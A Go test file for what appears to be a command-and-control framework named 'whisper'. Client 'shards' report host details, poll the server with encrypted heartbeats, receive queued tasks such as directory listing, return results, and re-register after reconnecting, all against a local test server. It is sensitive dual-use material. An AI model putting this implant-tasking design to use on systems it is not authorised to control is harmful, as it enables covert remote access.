// SPDX-License-Identifier: AGPL-3.0-only
package whisper

import (
	"encoding/json"
	"net/http/httptest"
	"testing"
	"time"
)

func TestCryptoRoundTrip(t *testing.T) {
	aPriv, err := NewEphemeral()
	if err != nil {
		t.Fatal(err)
	}
	bPriv, err := NewEphemeral()
	if err != nil {
		t.Fatal(err)
	}
	keyA, err := DeriveSessionKey(aPriv, PubHex(bPriv.PublicKey()))
	if err != nil {
		t.Fatal(err)
	}
	keyB, err := DeriveSessionKey(bPriv, PubHex(aPriv.PublicKey()))
	if err != nil {
		t.Fatal(err)
	}
	if keyA != keyB {
		t.Fatal("derived keys differ")
	}
	env, err := Seal(keyA, []byte("the wire remembers"))
	if err != nil {
		t.Fatal(err)
	}
	plain, err := Open(keyB, env)
	if err != nil {
		t.Fatal(err)
	}
	if string(plain) != "the wire remembers" {
		t.Fatalf("round trip mismatch: %q", plain)
	}
}

func TestBeatCarriesTasksAndResults(t *testing.T) {
	srv := NewServer()
	ts := httptest.NewTLSServer(srv)
	defer ts.Close()

	client, err := NewClient(ts.URL, true)
	if err != nil {
		t.Fatal(err)
	}
	ack, err := client.Handshake(Hello{
		ID:       "shard-test-1",
		Hostname: "localhost",
		OS:       "linux",
		Arch:     "arm64",
		User:     "tester",
	})
	if err != nil {
		t.Fatal(err)
	}
	if ack.ShardID != "shard-test-1" {
		t.Fatalf("unexpected shard id: %s", ack.ShardID)
	}

	taskID, err := srv.QueueTask(ack.ShardID, "gaze", map[string]string{"path": "/tmp"})
	if err != nil {
		t.Fatal(err)
	}

	beat, err := client.Beat(nil)
	if err != nil {
		t.Fatal(err)
	}
	if beat.Task == nil {
		t.Fatal("expected a queued task in the beat ack")
	}
	if beat.Task.ID != taskID || beat.Task.Word != "gaze" {
		t.Fatalf("unexpected task: %+v", beat.Task)
	}

	if _, err := client.Beat(&TaskResult{
		TaskID: taskID,
		Word:   "gaze",
		OK:     true,
		Result: "bin etc tmp",
		TS:     time.Now().Unix(),
	}); err != nil {
		t.Fatal(err)
	}
	res, err := srv.WaitTaskResult(taskID, 2*time.Second)
	if err != nil {
		t.Fatal(err)
	}
	if res.Result != "bin etc tmp" {
		t.Fatalf("unexpected result: %+v", res)
	}

	next, err := client.Beat(nil)
	if err != nil {
		t.Fatal(err)
	}
	if next.Task != nil {
		t.Fatalf("queue should be drained: %+v", next.Task)
	}

	shards := srv.ListShards()
	if len(shards) != 1 || shards[0].ID != "shard-test-1" {
		t.Fatalf("unexpected shard listing: %+v", shards)
	}

	resp, err := client.http.Get(ts.URL + "/whisper/v1/shards")
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	var listed []Shard
	if err := json.NewDecoder(resp.Body).Decode(&listed); err != nil {
		t.Fatal(err)
	}
	if len(listed) != 1 {
		t.Fatalf("unexpected http shard listing: %+v", listed)
	}
}

func TestReturningShardReconciles(t *testing.T) {
	srv := NewServer()
	ts := httptest.NewTLSServer(srv)
	defer ts.Close()

	hello := Hello{ID: "shard-test-1", Hostname: "lab-1", OS: "linux", Arch: "amd64", User: "tester"}
	c1, err := NewClient(ts.URL, true)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := c1.Handshake(hello); err != nil {
		t.Fatal(err)
	}
	first := srv.ListShards()[0].FirstSeen

	taskID, err := srv.QueueTask("shard-test-1", "anatomy", nil)
	if err != nil {
		t.Fatal(err)
	}

	// the same shard id registers again from a fresh session
	c2, err := NewClient(ts.URL, true)
	if err != nil {
		t.Fatal(err)
	}
	if _, err := c2.Handshake(hello); err != nil {
		t.Fatal(err)
	}
	shards := srv.ListShards()
	if len(shards) != 1 {
		t.Fatalf("reconcile should keep one entry: %+v", shards)
	}
	if !shards[0].FirstSeen.Equal(first) {
		t.Fatalf("first seen should survive reconciliation: %+v", shards[0])
	}

	beat, err := c2.Beat(nil)
	if err != nil {
		t.Fatal(err)
	}
	if beat.Task == nil || beat.Task.ID != taskID {
		t.Fatalf("queued task should survive the return: %+v", beat.Task)
	}
}

func TestWaitTaskResultTimesOut(t *testing.T) {
	srv := NewServer()
	start := time.Now()
	_, err := srv.WaitTaskResult("no-such-task", 300*time.Millisecond)
	if err == nil {
		t.Fatal("expected a timeout error")
	}
	if time.Since(start) < 250*time.Millisecond {
		t.Fatalf("returned too early: %s", time.Since(start))
	}
}
